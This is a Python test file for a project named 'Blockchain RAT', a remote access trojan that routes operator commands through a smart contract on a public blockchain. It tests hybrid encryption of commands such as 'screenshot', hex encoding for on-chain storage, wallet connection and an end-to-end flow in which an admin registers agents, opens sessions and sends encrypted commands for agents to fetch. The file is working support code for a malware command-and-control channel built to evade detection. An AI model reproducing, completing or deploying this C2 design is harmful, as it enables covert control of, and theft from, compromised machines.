"""
System tests for Blockchain RAT
Tests encryption, blockchain interaction, and end-to-end communication
"""

import sys
import os
import json
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from shared.encryption import EncryptionManager
from shared.blockchain_client import BlockchainClient


def test_encryption():
    """Test encryption functionality"""
    print("\n=== Testing Encryption ===")
    
    em = EncryptionManager()
    
    # Generate keypairs
    admin_keys = em.generate_rsa_keypair()
    agent_keys = em.generate_rsa_keypair()
    
    print("✓ Generated keypairs")
    
    # Test hybrid encryption
    test_data = "This is a test command: screenshot"
    
    # Encrypt
    encrypted = em.hybrid_encrypt(test_data, agent_keys['public_key'])
    print("✓ Encrypted data")
    
    # Encode for blockchain
    hex_payload = em.encode_payload_for_blockchain(encrypted)
    print(f"✓ Encoded for blockchain (length: {len(hex_payload)})")
    
    # Decode from blockchain
    decoded = em.decode_payload_from_blockchain(hex_payload)
    print("✓ Decoded from blockchain")
    
    # Decrypt
    decrypted = em.hybrid_decrypt(decoded, agent_keys['private_key'])
    decrypted_text = decrypted.decode('utf-8')
    
    assert decrypted_text == test_data, "Decryption failed!"
    print(f"✓ Decrypted successfully: {decrypted_text}")
    
    # Test public key conversion
    hex_key = em.public_key_to_hex(admin_keys['public_key'])
    recovered_key = em.hex_to_public_key(hex_key)
    
    assert recovered_key == admin_keys['public_key'], "Public key conversion failed!"
    print("✓ Public key conversion works")
    
    print("\n✅ All encryption tests passed!")
    return True


def test_blockchain_connection():
    """Test blockchain connection"""
    print("\n=== Testing Blockchain Connection ===")
    
    # Load test configuration
    config_path = Path(__file__).parent / 'test_config.json'
    
    if not config_path.exists():
        print("❌ test_config.json not found")
        print("Please create test_config.json with:")
        print(json.dumps({
            'rpc_url': 'https://rpc-mumbai.maticvigil.com',
            'private_key': 'your_private_key_here',
            'contract_address': 'deployed_contract_address'
        }, indent=2))
        return False
    
    with open(config_path, 'r') as f:
        config = json.load(f)
    
    try:
        client = BlockchainClient(config)
        print(f"✓ Connected to blockchain")
        print(f"  Address: {client.address}")
        
        # Check balance
        balance = client.get_balance()
        print(f"✓ Balance: {balance} MATIC")
        
        # Check gas price
        gas_price = client.get_gas_price()
        print(f"✓ Gas price: {gas_price} Gwei")
        
        print("\n✅ Blockchain connection test passed!")
        return True
    
    except Exception as e:
        print(f"❌ Blockchain connection failed: {e}")
        return False


def test_end_to_end():
    """Test end-to-end communication"""
    print("\n=== Testing End-to-End Communication ===")
    
    # This test requires a deployed contract and funded wallets
    print("This test requires:")
    print("1. Deployed SessionManager contract")
    print("2. Two funded wallets (admin and agent)")
    print("3. Configuration in test_config.json")
    
    config_path = Path(__file__).parent / 'test_config.json'
    
    if not config_path.exists():
        print("❌ test_config.json not found")
        return False
    
    with open(config_path, 'r') as f:
        config = json.load(f)
    
    try:
        # Setup encryption
        em = EncryptionManager()
        admin_keys = em.generate_rsa_keypair()
        agent_keys = em.generate_rsa_keypair()
        
        # Setup blockchain clients
        admin_client = BlockchainClient(config)
        
        # For testing, we'll use the same wallet for both
        # In production, these would be different wallets
        agent_client = admin_client
        
        print("✓ Initialized clients")
        
        # Register admin
        admin_key_hex = em.public_key_to_hex(admin_keys['public_key'])
        admin_client.register_agent(admin_key_hex)
        print("✓ Registered admin")
        
        # Register agent
        agent_key_hex = em.public_key_to_hex(agent_keys['public_key'])
        agent_client.register_agent(agent_key_hex)
        print("✓ Registered agent")
        
        # Create session
        session_id = admin_client.create_session(agent_client.address)
        print(f"✓ Created session: {session_id}")
        
        # Send command
        command = {'type': 'ping'}
        command_json = json.dumps(command)
        encrypted = em.hybrid_encrypt(command_json, agent_keys['public_key'])
        hex_payload = em.encode_payload_for_blockchain(encrypted)
        
        admin_client.send_message(session_id, hex_payload, 1)
        print("✓ Sent command")
        
        # Get messages
        messages = admin_client.get_messages(session_id, 0, 10)
        print(f"✓ Retrieved {len(messages)} messages")
        
        # Decrypt message
        if messages:
            msg = messages[0]
            encrypted_payload = msg[1]
            hex_payload = '0x' + encrypted_payload.hex()
            decoded = em.decode_payload_from_blockchain(hex_payload)
            decrypted = em.hybrid_decrypt(decoded, agent_keys['private_key'])
            command_data = json.loads(decrypted.decode('utf-8'))
            print(f"✓ Decrypted command: {command_data}")
        
        print("\n✅ End-to-end test passed!")
        return True
    
    except Exception as e:
        print(f"❌ End-to-end test failed: {e}")
        import traceback
        traceback.print_exc()
        return False


def main():
    """Run all tests"""
    print("=" * 60)
    print("Blockchain RAT System Tests")
    print("=" * 60)
    
    results = []
    
    # Test encryption
    results.append(("Encryption", test_encryption()))
    
    # Test blockchain connection
    results.append(("Blockchain Connection", test_blockchain_connection()))
    
    # Test end-to-end (optional, requires setup)
    # results.append(("End-to-End", test_end_to_end()))
    
    # Summary
    print("\n" + "=" * 60)
    print("Test Summary")
    print("=" * 60)
    
    for name, result in results:
        status = "✅ PASS" if result else "❌ FAIL"
        print(f"{name}: {status}")
    
    all_passed = all(result for _, result in results)
    
    if all_passed:
        print("\n🎉 All tests passed!")
        return 0
    else:
        print("\n⚠️  Some tests failed")
        return 1


if __name__ == "__main__":
    sys.exit(main())

